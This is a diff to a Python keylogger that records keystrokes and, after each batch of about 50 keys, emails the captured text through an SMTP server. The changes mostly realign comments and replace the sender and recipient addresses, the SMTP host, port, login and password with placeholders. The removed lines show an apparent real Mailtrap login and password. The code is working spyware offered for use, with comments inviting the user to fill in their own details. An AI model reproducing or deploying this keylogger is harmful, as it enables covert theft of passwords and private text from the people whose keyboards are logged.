@@ -18,17 +18,17 @@ import threading
 # Input your own details below.
 class EmailSender:
     def send_email(self, keys):
-        sender_email = "Private Person <from@example.com>" # Enter sender email here
-        receiver_email = "A test User <to@example.com>"    # Enter receiver email here
-        subject = "Py keylogger"                           # Enter email subject
-        message = keys                                     # puts logged keys into email body.
+        sender_email = "Sender person <send@example.com>"           # Enter sender email here
+        receiver_email = "Receiver person <receive@example.com>"    # Enter receiver email here
+        subject = "Keylogger text"                                  # Enter email subject
+        message = keys                                              # puts logged keys into email body.
 
         msg = f"Subject: {subject}\n\n{message}"  # This f-string formats the email for readability
 
-        smtp_server = "sandbox.smtp.mailtrap.io" # Enter your smtp server
-        port = 2525                             # Enter port to be used
-        login = "e53d03f1f6e0a8"                # Enter sender login username/email
-        password = "0c5f7789f9ff6b"             # Enter  sender password 
+        smtp_server = "my smtp server"    # Enter your smtp server
+        port = "enter port"               # Enter port to be used
+        login = "myemail@email.com"       # Enter sender login username/email
+        password = "MY password"          # Enter  sender password 
 
 # The code below is responsible for establishing a secure connection
 # with the chosen smtp server, authenticating in with the
@@ -47,41 +47,41 @@ class EmailSender:
 
 # This sets important definitions of how the
 # keylogger will function
-count = 0   # starts keylogging count at 0
-keys = []   # creates an empty list to store keystrokes
-email_sender = EmailSender()  # Establishes EmailSender instance for
-                              # sending the email notifications
+count = 0                      # starts keylogging count at 0
+keys = []                      # creates an empty list to store keystrokes
+email_sender = EmailSender()   # Establishes EmailSender instance for
+                               # sending the email notifications
 
 # This handles the key press events,
 # how to log the keys, and when to send
 # the email when count reaches a certain number.
 def on_press(key):
-    print("Key pressed") # prints a message when a key is pressed
-    global keys, count   # Access global variable for the keys & count
+    print("Key pressed")     # prints a message when a key is pressed
+    global keys, count       # Access global variable for the keys & count
     if key == Key.space:
-        keys.append(" ")  # Represents the space key as a space character
+        keys.append(" ")     # Represents the space key as a space character
     else:
         keys.append(str(key).replace("'", ""))
-    count += 1     # The increment at which to count logged keys
-    if count > 50: # Checks if the count exceeds threshold(adjust as desired)
-        count = 0  # reset the count
+    count += 1               # The increment at which to count logged keys
+    if count > 50:           # Checks if the count exceeds threshold(adjust as desired)
+        count = 0            # reset the count
         email_thread = threading.Thread(target=email, args=(''.join(keys),))
         email_thread.start()
-        keys = [] # This clears the list of logged keys for the next batch.
+        keys = []            # This clears the list of logged keys for the next batch.
 
 
 # This section takes the logged keys and
 # formats them so its easier to read.
 # in the sent email.
 def email(keys):
-    message = "" # starts an empty string to store the formatted message
+    message = ""   # starts an empty string to store the formatted message
     for key in keys:
         if key == Key.space:
             message += " " # put a space instead of typing"key.space" for spacebar
         else:
             message += str(key).replace("'", "") # removes single quotes from other keys
 
-    print(message) # prints formatted messsage for debugging
+    print(message)     # prints formatted messsage for debugging
     email_sender.send_email(message) # Emails the formatted keys
 
 
